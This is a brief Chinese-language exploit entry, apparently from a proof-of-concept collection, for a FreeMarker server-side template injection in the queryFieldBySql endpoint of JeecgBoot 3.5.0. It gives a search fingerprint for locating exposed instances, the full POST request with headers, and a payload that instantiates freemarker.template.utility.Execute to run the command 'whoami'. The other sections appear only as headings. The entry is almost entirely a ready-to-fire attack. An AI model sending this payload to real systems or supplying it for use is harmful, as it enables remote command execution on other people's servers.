# JeecgBoot企业级低代码平台queryFieldBySql基于SSTI的任意代码执行漏洞

- **系统**：JeecgBoot　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="JeecgBoot-企业级低代码平台"`
- **请求**：`POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/json`　`Content-Length: 105`

**请求体 / payload**
```
{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami\") }'" }
```

**其他**
- JeecgBoot企业级低代码平台queryFieldBySql基于SSTI的任意代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * JeecgBoot 3.5.0